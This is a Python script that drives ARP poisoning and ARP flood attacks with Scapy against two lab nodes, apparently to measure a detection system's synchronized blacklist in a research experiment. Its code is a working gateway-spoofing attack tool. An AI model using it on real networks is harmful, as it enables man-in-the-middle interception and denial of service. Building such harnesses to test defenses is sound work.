#!/usr/bin/env python3
"""SOP 3 two-node attack driver (experiment paper Tables 21 and 23).

One command per trial. It attacks Node A so Node A detects and broadcasts the
threat, then attacks Node B so the effect of the synchronized blacklist at Node
B can be measured (Table 23, Rate of Blocked / Reduced Attacks). It stops by
itself; there is no Ctrl-C to time by hand.

Why both MACs are resolved up front: once Node A has broadcast the attacker,
Node B drops the attacker's ARP frames in the kernel, so an ARP "who-has" for
Node B sent after that would get no reply and the B phase could not start. We
look both MACs up before any attacking begins.

    sudo python3 sop3_attack_ab.py \
        --node-a 192.168.68.109 --node-b 192.168.68.116 \
        --gateway 192.168.68.106 --mode flood

  --mode poison   targeted ARP MITM, ~100 PPS   (scenario S2)
  --mode flood    sustained ARP flood, ~1000 PPS (scenario S3)
  --a-seconds     how long to attack Node A   (default 6)
  --b-seconds     how long to attack Node B   (default 12)

The frames are the same as attack_generator.py: op=2 ARP replies addressed to
the victim's real MAC only (never broadcast), claiming to be the gateway, so no
other device on the LAN is disturbed. Node A is given long enough to detect
(the slowest of the 60 trials took ~3.5 s) and broadcast before Node B is hit.
"""
import argparse
import sys
import time

from scapy.all import ARP, Ether, sendp, srp


def resolve(ip):
    """The victim's real MAC, or None. Done before any blocking starts."""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=3, retry=2, verbose=0)
    return ans[0][1].hwsrc if ans else None


def attack(ip, mac, claim_ip, mode, seconds):
    """Flood/poison one victim for `seconds`, addressed to its MAC only."""
    gap = 0.02 if mode == "poison" else 0.001   # ~100 or ~1000 PPS
    pkt = Ether(dst=mac) / ARP(op=2, pdst=ip, hwdst=mac, psrc=claim_ip)
    label = "Targeted poisoning" if mode == "poison" else "Flooding"
    print(f"[AttackGen] {label} {ip} (claiming {claim_ip}) for {seconds:.0f} s...")
    sent = 0
    end = time.monotonic() + seconds
    while time.monotonic() < end:
        sendp(pkt, verbose=False)
        sent += 1
        time.sleep(gap)
    print(f"[AttackGen]   sent {sent} frames to {ip}.")
    return sent


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--node-a", required=True, help="detecting node (Kali A) IP")
    ap.add_argument("--node-b", required=True, help="second node (Kali B) IP")
    ap.add_argument("--gateway", required=True, help="gateway/router IP the frames claim to be")
    ap.add_argument("--mode", choices=["poison", "flood"], required=True)
    ap.add_argument("--a-seconds", type=float, default=6.0)
    ap.add_argument("--b-seconds", type=float, default=12.0)
    ap.add_argument("--settle", type=float, default=2.0,
                    help="pause after the A phase to let the broadcast reach B (default 2)")
    a = ap.parse_args()

    print("[AttackGen] Resolving MAC addresses before attacking (needed before Node B blocks us)...")
    mac_a = resolve(a.node_a)
    mac_b = resolve(a.node_b)
    if not mac_a:
        sys.exit(f"[AttackGen] Could not resolve Node A ({a.node_a}). Is it up? Is its agent already blocking this host?")
    if not mac_b:
        sys.exit(f"[AttackGen] Could not resolve Node B ({a.node_b}). Is it up? Is its agent already blocking this host?")
    print(f"[AttackGen]   Node A {a.node_a} -> {mac_a}")
    print(f"[AttackGen]   Node B {a.node_b} -> {mac_b}")

    try:
        print("\n[AttackGen] === Phase 1: Node A (detection + broadcast) ===")
        sent_a = attack(a.node_a, mac_a, a.gateway, a.mode, a.a_seconds)
        print(f"[AttackGen] Waiting {a.settle:.0f} s for the blacklist to reach Node B...")
        time.sleep(a.settle)
        print("\n[AttackGen] === Phase 2: Node B (synchronized blacklist) ===")
        sent_b = attack(a.node_b, mac_b, a.gateway, a.mode, a.b_seconds)
    except KeyboardInterrupt:
        print("\n[AttackGen] Interrupted.")
        return

    print(f"\n[AttackGen] Done. Node A: {sent_a} frames, Node B: {sent_b} frames.")
    print("[AttackGen] Node B's blocked/leaked counts are recorded by sop3_table23_nodeB.py on Node B.")


if __name__ == "__main__":
    main()
